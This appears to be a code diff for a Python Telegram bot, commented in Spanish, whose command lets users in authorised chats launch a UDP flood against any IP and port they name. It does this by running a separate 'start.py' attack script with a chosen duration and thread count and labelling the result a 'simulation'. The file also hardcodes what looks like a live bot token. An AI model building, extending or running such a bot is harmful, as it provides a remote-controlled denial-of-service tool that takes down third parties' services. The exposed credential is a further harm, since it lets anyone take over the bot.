@@ -2,18 +2,18 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 import subprocess
 
-# Token del bot
+# Token del bot (obtén el token de @BotFather en Telegram)
 TOKEN = "8019097232:AAGNUqNSWL_mUVCCupNZR6dd5ckOdzGmsT0"
 
-# Lista de chats permitidos (IDs de chats o grupos de Telegram)
-allowed_chats = ['-1002392775903']  # Usa el ID de tu grupo o chat aquí
+# Lista de chats autorizados
+allowed_chats = ['-1002392775903']  # Reemplaza con los IDs de los chats autorizados
 
 # Comando para iniciar un ataque UDP
 async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Verifica que el chat esté autorizado
-    chat_id = str(update.effective_chat.id)
+    # Verifica si el ID del chat está autorizado
+    chat_id = str(update.message.chat_id)
     if chat_id not in allowed_chats:
-        await update.message.reply_text("Este bot no está permitido en este chat o grupo.")
+        await update.message.reply_text("Este chat no está autorizado para usar este comando.")
         return
 
     # Verifica que el usuario haya ingresado los parámetros necesarios
@@ -24,26 +24,19 @@ async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # Obtiene los argumentos del mensaje
-    target = context.args[0]
-    duration = context.args[1]
-    threads = context.args[2]
+    target = context.args[0]  # Dirección IP:Puerto
+    duration = context.args[1]  # Duración en segundos
+    threads = context.args[2]  # Número de threads
 
     # Construye el comando a ejecutar
     command = f"python3 start.py UDP {target} {duration} {threads}"
-
+    
+    # Ejecuta el comando y responde al usuario
     try:
-        # Ejecuta el comando y captura la salida
         process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
-
-        # Verifica si hay errores en la ejecución del comando
-        if process.returncode != 0:
-            await update.message.reply_text(f"Error al ejecutar el comando:\n{stderr.decode()}")
-        else:
-            await update.message.reply_text(
-                f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
-            )
-
+        await update.message.reply_text(
+            f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
+        )
     except Exception as e:
         await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")
 
